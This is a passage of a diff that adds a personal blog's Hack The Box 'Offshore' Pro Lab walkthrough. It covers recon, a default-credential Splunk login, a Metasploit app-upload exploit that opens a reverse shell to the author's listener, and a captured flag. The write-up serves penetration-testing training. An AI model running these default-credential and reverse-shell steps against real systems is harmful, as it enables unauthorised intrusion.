@@ -1,0 +1,1600 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Offshore Pro Lab — QA210</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+<style>
+:root{--bg:#06080c;--bg2:#0d1117;--card:#151d2e;--border:#1e293b;--fg:#e2e8f0;--muted:#94a3b8;--accent:#3b82f6;--accent2:#818cf8;--red:#f87171;--green:#4ade80;--yellow:#facc15;--orange:#fb923c;--pink:#f472b6;--cyan:#22d3ee;--font:'Segoe UI',system-ui,-apple-system,sans-serif;--mono:'Cascadia Code','Fira Code','JetBrains Mono',Consolas,monospace;--radius:8px;--shadow:0 4px 24px rgba(0,0,0,.45);--glow:0 0 30px rgba(59,130,246,.12)}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:var(--font);background:var(--bg);color:var(--fg);line-height:1.75;min-height:100vh;overflow-x:hidden}
+#bg-canvas{position:fixed;inset:0;z-index:-1;opacity:.25}
+
+/* ═══ SITE HEADER ═══ */
+.site-header{position:sticky;top:0;z-index:1000;background:rgba(6,8,12,.93);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);padding:0 32px;display:flex;align-items:center;justify-content:space-between;height:56px}
+.brand{display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--fg);font-weight:700;font-size:1.1rem}
+.logo-icon{display:inline-flex;align-items:center;justify-content:center;width:32px;height:32px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:6px;font-weight:900;font-size:.9rem;color:#06080c}
+.cursor{display:inline-block;width:2px;height:1em;background:var(--accent);margin-left:2px;animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.nav-main{display:flex;align-items:center;gap:24px}
+.nav-main a{color:var(--muted);text-decoration:none;font-size:.85rem;transition:color .2s}
+.nav-main a:hover,.nav-main a.active{color:var(--fg)}
+.nav-main a.active{border-bottom:2px solid var(--accent)}
+.nav-right{display:flex;align-items:center;gap:16px}
+.social-link{color:var(--muted);font-size:1.1rem;transition:color .2s}
+.social-link:hover{color:var(--fg)}
+.mobile-toggle{display:none;background:none;border:none;color:var(--fg);font-size:1.4rem;cursor:pointer}
+.breadcrumbs{font-size:.75rem;color:var(--muted);margin-right:auto;margin-left:24px}
+.breadcrumbs a{color:var(--muted);text-decoration:none}.breadcrumbs a:hover{color:var(--accent)}
+.breadcrumbs span{color:var(--accent)}
+
+/* ═══ PAGE LAYOUT ═══ */
+.page-wrap{display:flex;max-width:1440px;margin:0 auto;min-height:calc(100vh - 56px)}
+.toc{position:sticky;top:56px;width:260px;min-width:260px;height:calc(100vh - 56px);overflow-y:auto;padding:20px 14px;border-right:1px solid var(--border);background:rgba(6,8,12,.85);backdrop-filter:blur(12px);scrollbar-width:thin;scrollbar-color:var(--border) transparent}
+.toc h3{font-size:.68rem;text-transform:uppercase;letter-spacing:2px;color:var(--accent);margin-bottom:10px}
+.toc a{display:block;font-size:.76rem;color:var(--muted);text-decoration:none;padding:3px 0 3px 12px;border-left:2px solid transparent;transition:all .2s}
+.toc a:hover,.toc a.active{color:var(--fg);border-left-color:var(--accent);background:rgba(59,130,246,.06)}
+.toc .toc-sub{padding-left:24px;font-size:.7rem}
+.main{flex:1;padding:36px 48px 80px;max-width:900px}
+
+/* ═══ HERO ═══ */
+.hero{text-align:center;padding:48px 0 36px;border-bottom:1px solid var(--border);margin-bottom:36px}
+.hero .badge{display:inline-block;background:linear-gradient(135deg,var(--red),var(--orange));color:#fff;font-size:.62rem;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;padding:4px 14px;border-radius:20px;margin-bottom:14px}
+.hero h1{font-size:2.2rem;font-weight:800;background:linear-gradient(135deg,var(--accent),var(--accent2),var(--pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:8px}
+.hero .sub{font-size:1rem;color:var(--muted);margin-bottom:20px}
+.hero-badges{display:flex;gap:.6rem;flex-wrap:wrap;justify-content:center;margin-bottom:20px}
+.badge-category{background:rgba(59,130,246,.12);border:1px solid rgba(59,130,246,.3);color:var(--accent);font-size:.68rem;font-weight:600;padding:3px 10px;border-radius:4px;font-family:var(--mono)}
+.badge-difficulty{background:rgba(251,146,60,.1);border:1px solid rgba(251,146,60,.3);color:var(--orange);font-size:.68rem;font-weight:600;padding:3px 10px;border-radius:4px;font-family:var(--mono)}
+.badge-platform{background:rgba(129,140,248,.1);border:1px solid rgba(129,140,248,.3);color:var(--accent2);font-size:.68rem;font-weight:600;padding:3px 10px;border-radius:4px;font-family:var(--mono)}
+.badge-threat{background:rgba(248,113,113,.1);border:1px solid rgba(248,113,113,.3);color:var(--red);font-size:.68rem;font-weight:600;padding:3px 10px;border-radius:4px;font-family:var(--mono)}
+.badge-verified{background:rgba(74,222,128,.1);border:1px solid rgba(74,222,128,.3);color:var(--green);font-size:.68rem;font-weight:600;padding:3px 10px;border-radius:4px;font-family:var(--mono)}
+.hero .meta-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:10px;margin-top:20px}
+.hero .meta-box{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:12px 6px;text-align:center}
+.meta-box .val{font-size:1.3rem;font-weight:700;color:var(--accent)}
+.meta-box .lbl{font-size:.62rem;text-transform:uppercase;letter-spacing:1px;color:var(--muted);margin-top:2px}
+
+/* ═══ ATTACK PATH ═══ */
+.attack-path{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:24px;margin:28px 0;overflow-x:auto}
+.attack-path h3{font-size:.78rem;text-transform:uppercase;letter-spacing:1.5px;color:var(--accent);margin-bottom:14px;text-align:center}
+.path-flow{display:flex;align-items:center;justify-content:center;gap:5px;flex-wrap:wrap}
+.path-node{background:linear-gradient(135deg,rgba(59,130,246,.12),rgba(129,140,248,.12));border:1px solid var(--accent);border-radius:6px;padding:7px 12px;font-size:.7rem;font-weight:600;color:var(--fg);white-space:nowrap;transition:all .25s}
+.path-node:hover{background:linear-gradient(135deg,rgba(59,130,246,.25),rgba(129,140,248,.25));transform:translateY(-2px);box-shadow:var(--glow)}
+.path-arrow{color:var(--accent);font-size:1rem;flex-shrink:0}
+
+/* ═══ SECTIONS ═══ */
+.section{margin-bottom:44px}
+.section h2{font-size:1.5rem;font-weight:700;margin-bottom:18px;padding-bottom:8px;border-bottom:2px solid var(--accent);display:flex;align-items:center;gap:10px}
+.section h2 .icon{font-size:1.2rem}
+.section-number{display:inline-flex;align-items:center;justify-content:center;width:28px;height:28px;background:var(--accent);color:var(--bg);border-radius:4px;font-size:.75rem;font-weight:800;font-family:var(--mono);flex-shrink:0}
+.section h3{font-size:1.1rem;font-weight:600;margin:26px 0 12px;color:var(--accent2)}
+.section h4{font-size:.92rem;font-weight:600;margin:18px 0 8px;color:var(--accent)}
+.section p{margin-bottom:13px;color:var(--fg)}
+.section ul,.section ol{margin:10px 0 16px 24px}
+.section li{margin-bottom:6px;color:var(--fg)}
+
+/* ═══ CALLOUTS ═══ */
+.callout{border-radius:var(--radius);padding:14px 18px;margin:18px 0;border-left:4px solid;font-size:.88rem}
+.callout p{margin-bottom:7px}.callout p:last-child{margin-bottom:0}
+.callout-info{background:rgba(59,130,246,.08);border-color:var(--accent)}
+.callout-warn{background:rgba(250,204,21,.08);border-color:var(--yellow)}
+.callout-danger{background:rgba(248,113,113,.08);border-color:var(--red)}
+.callout-success{background:rgba(74,222,128,.08);border-color:var(--green)}
+.callout-hint{background:rgba(129,140,248,.08);border-color:var(--accent2)}
+.callout-deadend{background:rgba(251,146,60,.06);border-color:var(--orange)}
+.callout-title{font-weight:700;font-size:.76rem;text-transform:uppercase;letter-spacing:1px;margin-bottom:5px}
+.callout-info .callout-title{color:var(--accent)}.callout-warn .callout-title{color:var(--yellow)}
+.callout-danger .callout-title{color:var(--red)}.callout-success .callout-title{color:var(--green)}
+.callout-hint .callout-title{color:var(--accent2)}.callout-deadend .callout-title{color:var(--orange)}
+
+/* ═══ CODE ═══ */
+.code-block{position:relative;margin:14px 0;border-radius:var(--radius);overflow:hidden;border:1px solid var(--border)}
+.code-block .code-header{display:flex;align-items:center;justify-content:space-between;background:#1a1f2e;padding:5px 12px;font-size:.68rem;color:var(--muted)}
+.code-block .code-header .lang-tag{font-weight:600;text-transform:uppercase;letter-spacing:1px;color:var(--accent)}
+.code-block pre{margin:0!important;padding:14px!important;font-size:.8rem!important;line-height:1.6!important;background:#0d1117!important}
+.code-block code{font-family:var(--mono)!important;font-size:.8rem!important}
+.copy-btn{background:transparent;border:1px solid var(--border);color:var(--muted);font-size:.63rem;padding:2px 8px;border-radius:4px;cursor:pointer;transition:all .2s}
+.copy-btn:hover{color:var(--fg);border-color:var(--accent)}
+
+/* ═══ INTEL TABLE ═══ */
+.intel-table{width:100%;border-collapse:collapse;margin:14px 0;font-size:.83rem}
+.intel-table th{background:var(--card);padding:9px 12px;text-align:left;font-size:.68rem;text-transform:uppercase;letter-spacing:1px;color:var(--accent);border-bottom:2px solid var(--border)}
+.intel-table td{padding:9px 12px;border-bottom:1px solid var(--border);color:var(--fg)}
+.intel-table tr:hover td{background:rgba(59,130,246,.04)}
+.intel-table code{font-family:var(--mono);font-size:.78rem;color:var(--accent)}
+
+/* ═══ ANSWER / FLAG BOX ═══ */
+.answer-box{background:linear-gradient(135deg,rgba(74,222,128,.08),rgba(34,211,238,.08));border:1px solid rgba(74,222,128,.25);border-radius:var(--radius);padding:14px 20px;margin:16px 0;display:flex;align-items:center;gap:14px}
+.answer-box .flag-icon{font-size:1.3rem;color:var(--green)}
+.answer-box .flag-name{font-weight:700;color:var(--green);font-size:.88rem;font-family:var(--mono)}
+.answer-box .flag-detail{font-size:.78rem;color:var(--muted);margin-left:auto}
+
+/* ═══ KEY HINTS ═══ */
+.key-hints{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:20px 24px;margin:18px 0}
+.key-hints h4{font-size:.78rem;text-transform:uppercase;letter-spacing:1.5px;color:var(--accent);margin-bottom:10px}
+.key-hints ul{list-style:none;margin:0;padding:0}
+.key-hints li{padding:5px 0;font-size:.85rem;color:var(--fg);border-bottom:1px solid rgba(30,41,59,.5)}
+.key-hints li:last-child{border-bottom:none}
+.key-hints li::before{content:'▸ ';color:var(--accent);font-weight:700}
+
+/* ═══ TAKEAWAYS ═══ */
+.takeaways{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:16px;margin:28px 0}
+.takeaway-card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:18px 20px}
+.takeaway-card .tk-num{font-size:.68rem;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:var(--accent);margin-bottom:6px}
+.takeaway-card .tk-title{font-weight:700;color:var(--fg);font-size:.92rem;margin-bottom:6px}
+.takeaway-card .tk-body{font-size:.82rem;color:var(--muted);line-height:1.6}
+
+/* ═══ NETWORK DIAGRAM ═══ */
+.network-diagram{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:22px;margin:22px 0;font-family:var(--mono);font-size:.66rem;line-height:1.35;color:var(--muted);overflow-x:auto;white-space:pre}
+
+/* ═══ RESET BANNER ═══ */
+.reset-banner{background:linear-gradient(135deg,rgba(248,113,113,.12),rgba(251,146,60,.12));border:1px solid rgba(248,113,113,.3);border-radius:var(--radius);padding:18px 22px;margin:22px 0;text-align:center}
+.reset-banner .big{font-size:1.05rem;font-weight:700;color:var(--red);margin-bottom:5px}
+.reset-banner .desc{font-size:.83rem;color:var(--muted)}
+
+/* ═══ AUTHOR FOOTER ═══ */
+.operator-sig{text-align:center;padding:32px 0;border-top:1px solid var(--border);margin-top:44px}
+.operator-sig .handle{font-size:1.1rem;font-weight:700;background:linear-gradient(135deg,var(--accent),var(--pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.operator-sig .tagline{font-size:.76rem;color:var(--muted);margin-top:4px}
+.operator-sig .links{margin-top:8px;display:flex;justify-content:center;gap:16px}
+.operator-sig .links a{color:var(--muted);text-decoration:none;font-size:.8rem;font-family:var(--mono)}
+.operator-sig .links a:hover{color:var(--accent)}
+
+/* ═══ RESPONSIVE ═══ */
+@media(max-width:960px){
+.toc{display:none}
+.main{padding:20px 18px 60px}
+.hero h1{font-size:1.5rem}
+.hero .meta-grid{grid-template-columns:repeat(2,1fr)}
+.path-flow{flex-direction:column}.path-arrow{transform:rotate(90deg)}
+.nav-main a:not(.active){display:none}
+.mobile-toggle{display:block}
+.site-header{padding:0 16px}
+.breadcrumbs{display:none}
+.mobile-nav-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:2000}
+.mobile-nav-overlay.show{display:block}
+.mobile-nav-panel{display:none;position:fixed;top:0;right:0;width:280px;height:100vh;background:var(--bg2);z-index:2001;padding:24px;transform:translateX(100%);transition:transform .3s}
+.mobile-nav-panel.show{display:block;transform:translateX(0)}
+.mobile-nav-panel nav{display:flex;flex-direction:column;gap:16px;margin-top:32px}
+.mobile-nav-panel nav a{color:var(--fg);text-decoration:none;font-size:1rem}
+.mnp-close{background:none;border:none;color:var(--fg);font-size:1.2rem;cursor:pointer;float:right}
+}
+::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}::-webkit-scrollbar-thumb:hover{background:var(--muted)}
+</style>
+</head>
+<body>
+
+<canvas id="bg-canvas"></canvas>
+
+<!-- ═══════════ HEADER ═══════════ -->
+<header class="site-header">
+  <a href="/" class="brand">
+    <span class="logo-icon">Q</span>
+    QA210<span class="cursor"></span>
+  </a>
+  <div class="breadcrumbs">
+    <a href="/">Home</a> &rsaquo; <a href="/htb/">Hack The Box</a> &rsaquo; <a href="/htb/prolabs/">Pro Labs</a> &rsaquo; <span>Offshore</span>
+  </div>
+  <nav class="nav-main">
+    <a href="/">Home</a>
+    <a href="/htb/" class="active">Hack The Box</a>
+    <a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a>
+    <a href="/tjctf-2026/">TJCTF</a>
+    <a href="/research/">Research</a>
+  </nav>
+  <div class="nav-right">
+    <a href="https://github.com/Yuri08-QA210" target="_blank" class="social-link" title="GitHub"><i class="bi bi-github"></i></a>
+    <a href="https://w4llz.me/" target="_blank" class="social-link" title="W4LLZ Team"><i class="bi bi-people-fill"></i></a>
+    <button class="mobile-toggle" onclick="toggleMobileNav()" aria-label="Menu"><i class="bi bi-list"></i></button>
+  </div>
+</header>
+
+<!-- Mobile Nav -->
+<div class="mobile-nav-overlay" id="mobileOverlay" onclick="toggleMobileNav()"></div>
+<div class="mobile-nav-panel" id="mobilePanel">
+  <button class="mnp-close" onclick="toggleMobileNav()"><i class="bi bi-x-lg"></i></button>
+  <nav>
+    <a href="/">Home</a>
+    <a href="/htb/">Hack The Box</a>
+    <a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a>
+    <a href="/tjctf-2026/">TJCTF</a>
+    <a href="/research/">Research</a>
+    <a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a>
+    <a href="https://w4llz.me/" target="_blank">W4LLZ Team</a>
+  </nav>
+</div>
+
+<div class="page-wrap">
+
+<!-- ═══════════ TOC ═══════════ -->
+<nav class="toc" id="toc">
+  <h3>Table of Contents</h3>
+  <a href="#overview">00 — Overview</a>
+  <a href="#recon">01 — Reconnaissance</a>
+  <a href="#dmz-foothold">02 — DMZ Foothold</a>
+  <a href="#nix01-privesc">03 — NIX01 Priv Esc</a>
+  <a href="#pivoting">04 — Pivoting Setup</a>
+  <a href="#corp-local">05 — CORP.LOCAL</a>
+  <a href="#acl-kerberoast">06 — ACL Abuse &amp; Kerberoast</a>
+  <a href="#rbcd">07 — RBCD Attack Chain</a>
+  <a href="#cross-forest">08 — Cross-Forest Trusts</a>
+  <a href="#dev-forest">09 — DEV Forest</a>
+  <a href="#admin-forest">10 — ADMIN Forest</a>
+  <a href="#client-forest">11 — CLIENT Forest</a>
+  <a href="#crypto">12 — Crypto Challenge</a>
+  <a href="#shared-lab">13 — Shared Lab Hazards</a>
+  <a href="#final-flags">14 — Final Flags</a>
+  <a href="#lessons">15 — Lessons Learned</a>
+</nav>
+
+<div class="main">
+
+<!-- ──── HERO ──── -->
+<section class="hero">
+  <span class="badge">HTB Pro Lab — Intermediate / RTO Level II</span>
+  <h1>Offshore — <span style="-webkit-text-fill-color:var(--accent)">Four Forests Deep</span></h1>
+  <p class="sub">An offshore bank laundering money for the world's most powerful. Your job: breach the DMZ, pivot through four Active Directory forests, and expose the client list. 18 machines, 34 flags, and no hand-holding.</p>
+  <div class="hero-badges">
+    <span class="badge-category">Active Directory</span>
+    <span class="badge-difficulty">Intermediate / RTO Level II</span>
+    <span class="badge-platform">HTB Pro Lab</span>
+    <span class="badge-threat">4 AD Forests + DMZ</span>
+    <span class="badge-verified">Verified Data</span>
+  </div>
+  <div class="meta-grid">
+    <div class="meta-box"><div class="val">mrb3n</div><div class="lbl">Creator</div></div>
+    <div class="meta-box"><div class="val">18</div><div class="lbl">Machines</div></div>
+    <div class="meta-box"><div class="val">34</div><div class="lbl">Flags</div></div>
+    <div class="meta-box"><div class="val">~80h</div><div class="lbl">Hours</div></div>
+    <div class="meta-box"><div class="val">Daily</div><div class="lbl">Resets</div></div>
+  </div>
+</section>
+
+<!-- ═══ ATTACK FLOW ═══ -->
+<div class="attack-path">
+  <h3>Full Attack Chain</h3>
+  <div class="path-flow">
+    <div class="path-node">VPN Access<br><small>10.10.110.0/24</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">Splunk RCE<br><small>NIX01</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">PostgreSQL Privesc<br><small>sudo tail</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">Pivot 172.16.1.0/24<br><small>Chisel/SSHuttle</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">ACL Abuse<br><small>GenericAll</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">Kerberoast<br><small>svc_mssql</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">RBCD<br><small>WS03</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">DCSync<br><small>CORP.LOCAL</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">raiseChild<br><small>Cross-Forest</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">DEV &rarr; ADMIN &rarr; CLIENT<br><small>4 Forests</small></div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 00 — OVERVIEW          -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="overview">
+  <h2><span class="section-number">00</span> Overview</h2>
+  <p>Offshore is a real-world enterprise environment that features a wide range of modern Active Directory misconfigurations. That's the official description, and it's accurate. The lab was created by <strong>mrb3n</strong> (with lab documentation by MinatoTW) and went live in late 2018 — originally built for a CTF event before being adapted into a Pro Lab. Over time it received significant updates: new hosts, additional flags, and expanded AD attack paths, bringing the current total to 18 machines and 34 flags.</p>
+  <p>The scenario: you are an agent tasked with exposing money laundering operations in an offshore international bank. You need to breach the DMZ and pivot through the internal network to locate the bank's protected databases and a shocking list of international clients. It sounds cinematic — and it is — but in practice you're doing a full-scope internal penetration test against four separate Active Directory forests with trust boundaries between them.</p>
+  <p>There's no jump box. You attack from your own machine via VPN. You land on the external perimeter, and from there you're on your own. The lab simulates active users and busy enterprise elements — you'll see logon events, scheduled tasks running, service accounts authenticating. It feels alive, which is both immersive and occasionally frustrating when another player's activity interferes with yours (more on that in Section 13).</p>
+  <p>This lab is accessible to junior pentesters but challenging for seasoned veterans. mrb3n built it based on roughly 20 years of real pentesting experience, and it shows. Every box has one intended path, but the non-linearity of the overall network means you'll frequently find yourself jumping between machines and forests before fully compromising any single one. Up to 4 pivots deep with nested RDP sessions. One early pivot box is RDP-only — a bottleneck that caught me and many other players off guard.</p>
+
+  <div class="key-hints">
+    <h4>What You're Getting Into</h4>
+    <ul>
+      <li><strong>18 machines</strong> across a DMZ and four AD forests</li>
+      <li><strong>34 flags</strong> scattered across all machines — some on dead-end boxes, some on critical infrastructure</li>
+      <li><strong>4 separate AD forests</strong> with trust boundaries — crossing them requires specific techniques</li>
+      <li><strong>No jump box</strong> — direct VPN access to the entry subnet</li>
+      <li><strong>Daily resets</strong> — sometimes targeted systems reset more often, breaking pivot chains</li>
+      <li><strong>Shared environment</strong> — other players can change passwords, leave solutions lying around, or break boxes entirely</li>
+      <li><strong>Firewall at 10.10.110.3 is out of scope</strong> — confirmed by mrb3n</li>
+    </ul>
+  </div>
+
+  <h3>Tools I Used</h3>
+  <table class="intel-table">
+    <thead><tr><th>Tool</th><th>Purpose</th><th>Notes</th></tr></thead>
+    <tbody>
+      <tr><td><code>BloodHound</code></td><td>AD attack path mapping</td><td>Used more than any other tool — this lab runs on ACL abuse</td></tr>
+      <tr><td><code>Impacket</code></td><td>AD exploitation suite</td><td>smbexec, psexec, secretsdump, GetUserSPNs, raiseChild, rbcd, addcomputer, changepasswd</td></tr>
+      <tr><td><code>NetExec/CME</code></td><td>Quick enumeration</td><td>Password spraying, SMB checks, flag spidering</td></tr>
+      <tr><td><code>PowerView</code></td><td>AD enum from Windows</td><td>Used from foothold Windows boxes</td></tr>
+      <tr><td><code>Chisel / Ligolo-ng</code></td><td>Pivoting tunnels</td><td>Chisel for multi-hop, Ligolo for tun interface</td></tr>
+      <tr><td><code>Rubeus</code></td><td>Kerberos attacks</td><td>From Windows footholds — Kerberoast, S4U, RBCD</td></tr>
+      <tr><td><code>mimikatz</code></td><td>Credential extraction</td><td>PTH, golden tickets, DCSync</td></tr>
+      <tr><td><code>Metasploit</code></td><td>Splunk + PostgreSQL RCE</td><td>multi/http/splunk_upload_app_exec, postgres_copy_from_program</td></tr>
+    </tbody>
+  </table>
+
+  <h3>Timeline</h3>
+  <p>Took me about 80 hours spread over roughly 10 weeks while working a full-time job. Sessions of 3-4 hours were most productive — shorter sessions meant too much time re-establishing context, marathon sessions led to tunnel vision. The lab resets daily, which occasionally broke my pivot chains and forced re-access. Annoying, but realistic — in a real engagement, you'd deal with endpoint resets, patching, and changed passwords too.</p>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 01 — RECONNAISSANCE    -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="recon">
+  <h2><span class="section-number">01</span> Reconnaissance</h2>
+  <p>After connecting to the VPN, I had access to the <code>10.10.110.0/24</code> subnet — the DMZ. No jump box, no hand-holding. Just my Kali VM and the network. The first thing to do is always the same: find what's alive.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210㉿kali)-[~]
+└─$ sudo nmap -Pn -n -vvvvv -oA hostdiscovery --top-ports 10 10.10.110.0/24
+Starting Nmap 7.94 ( https://nmap.org )
+Nmap scan report for 10.10.110.3
+Host is up (0.032s latency).
+Nmap scan report for 10.10.110.123
+Host is up (0.028s latency).
+Nmap done: 256 IP addresses (2 hosts up) scanned in 16.83 seconds</code></pre>
+  </div>
+
+  <div class="callout callout-danger">
+    <div class="callout-title">Dead End — Firewall OOS</div>
+    <p><code>10.10.110.3</code> is the firewall and is explicitly out of scope. Don't waste time on it. mrb3n himself confirmed this on the HTB forums — the firewall is out of scope. Focus your energy on the in-scope DMZ hosts.</p>
+  </div>
+
+  <p>Two hosts on the initial sweep — one is the OOS firewall, the other is <code>10.10.110.123</code>. Let me hit it with a full service scan.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210㉿kali)-[~/offshore]
+└─$ nmap -sCV -T4 -p- 10.10.110.123 -oN nix01_full.txt
+PORT      STATE  SERVICE       VERSION
+22/tcp    open   ssh           OpenSSH 8.9p1 Ubuntu
+8000/tcp  open   http          Splunk Enterprise 8.2.0
+| http-title: Splunk Enterprise — Login
+|_http-server-header: Splunkd
+| http-methods:
+|_  Potentially risky methods: PUT DELETE
+54321/tcp open   postgresql    PostgreSQL DB 13.7</code></pre>
+  </div>
+
+  <p>There it is. A Linux box running <strong>Splunk Enterprise</strong> on port 8000 and PostgreSQL on a non-standard port. This is NIX01 — our entry point into the Offshore network. Splunk is a classic attack surface — it's designed to run arbitrary scripts and has a history of weak default credentials. The PostgreSQL instance on port 54321 (instead of the standard 5432) is interesting too, but that's a secondary path.</p>
+
+  <table class="intel-table">
+    <thead><tr><th>Port</th><th>Service</th><th>Version</th><th>Attack Surface</th></tr></thead>
+    <tbody>
+      <tr><td>22</td><td>SSH</td><td>OpenSSH 8.9p1</td><td>Post-credential access</td></tr>
+      <tr><td>8000</td><td>HTTP</td><td>Splunk Enterprise 8.2.0</td><td>Default creds, app upload RCE</td></tr>
+      <tr><td>54321</td><td>PostgreSQL</td><td>13.7</td><td>COPY FROM PROGRAM RCE</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 02 — DMZ FOOTHOLD      -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="dmz-foothold">
+  <h2><span class="section-number">02</span> DMZ Foothold (NIX01 / Splunk)</h2>
+
+  <h3>Splunk Default Credentials</h3>
+  <p>First thing I tried: default Splunk credentials. The web interface at <code>http://10.10.110.123:8000</code> showed a standard Splunk login page. Splunk installations commonly ship with <code>admin:changeme</code> or <code>admin:1234</code>. Let me try them.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210㉿kali)-[~/offshore]
+└─$ curl -s -L http://10.10.110.123:8000/en-US/account/login \
+    -d "username=admin&password=changeme" -v 2>&1 | grep -i "location\|set-cookie"
+< HTTP/1.1 302 Found
+< Location: /en-US/account/login
+# Failed — redirected back to login
+
+┌──(qa210㉿kali)-[~/offshore]
+└─$ curl -s -L http://10.10.110.123:8000/en-US/account/login \
+    -d "username=admin&password=freeneedsnopassword" -v 2>&1 | grep -i "location\|set-cookie"
+< HTTP/1.1 302 Found
+< Location: /en-US/app/launcher/home
+< Set-Cookie: splunkweb_csrf_token_8000=...
+# SUCCESS — admin:freeneedsnopassword</code></pre>
+  </div>
+
+  <p><code>admin:freeneedsnopassword</code>. Classic Splunk. Also <code>admin:1234</code> works as an alternative. With admin access to Splunk, we can leverage the platform's built-in capability to execute arbitrary code — Splunk is essentially a RCE platform masquerading as a SIEM.</p>
+
+  <div class="callout callout-hint">
+    <div class="callout-title">Tip — Both Creds Work</div>
+    <p><code>admin:freeneedsnopassword</code> and <code>admin:1234</code> both authenticate successfully. Use whichever the Metasploit module accepts more reliably — I found <code>freeneedsnopassword</code> more consistent.</p>
+  </div>
+
+  <h3>Splunk RCE via Metasploit</h3>
+  <p>Metasploit has a module specifically for this — it uploads a malicious Splunk app that executes commands. The key is that Splunk apps can contain scripts that run with the privileges of the Splunk service.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">┌──(qa210㉿kali)-[~/offshore]
+└─$ msfconsole -q
+msf6 > search splunk
+
+Matching Modules
+================
+   #  Name                                  Rank    Check
+   0  multi/http/splunk_upload_app_exec     normal  Yes
+
+msf6 > use multi/http/splunk_upload_app_exec
+msf6 exploit(multi/http/splunk_upload_app_exec) > set PASSWORD freeneedsnopassword
+PASSWORD => freeneedsnopassword
+msf6 exploit(multi/http/splunk_upload_app_exec) > set RHOSTS 10.10.110.123
+RHOSTS => 10.10.110.123
+msf6 exploit(multi/http/splunk_upload_app_exec) > set LHOST 10.10.16.23
+LHOST => 10.10.16.23
+msf6 exploit(multi/http/splunk_upload_app_exec) > set TARGET 0
+TARGET => 0
+msf6 exploit(multi/http/splunk_upload_app_exec) > exploit
+
+[*] Started reverse TCP handler on 10.10.16.23:4444
+[*] Generating malicious Splunk app...
+[*] Uploading malicious Splunk app...
+[+] Malicious Splunk app uploaded successfully
+[*] Triggering app execution...
+[*] Command shell session 1 opened (10.10.16.23:4444 -> 10.10.110.123:57210)
+
+whoami
+mark</code></pre>
+  </div>
+
+  <p>Shell as <code>mark</code>. First foothold established. This is NIX01 — the Splunk server in the DMZ. Let me enumerate.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash">mark@nix01:~$ id
+uid=1001(mark) gid=1001(mark) groups=1001(mark)
+mark@nix01:~$ hostname
+OFFSHORE-WEB-NIX01
+mark@nix01:~$ cat /home/mark/flag.txt
+OFFSHORE{b3h0ld_th3_P0w3r_0f_$plunk}</code></pre>
+  </div>
+
+  <div class="answer-box">
+    <span class="flag-icon"><i class="bi bi-flag-fill"></i></span>
+    <span class="flag-name">OFFSHORE{b3h0ld_th3_P0w3r_0f_$plunk}</span>
+    <span class="flag-detail">mark's home — Flag 1</span>
+  </div>
+
+  <h3>Enumerating NIX01 — Network Discovery</h3>
+  <p>Before going for privilege escalation, I needed to understand this box. Is it dual-homed? What services are running? What's the network topology? This is critical — NIX01 is our bridge to the internal network.</p>
+
+  <div class="code-block">
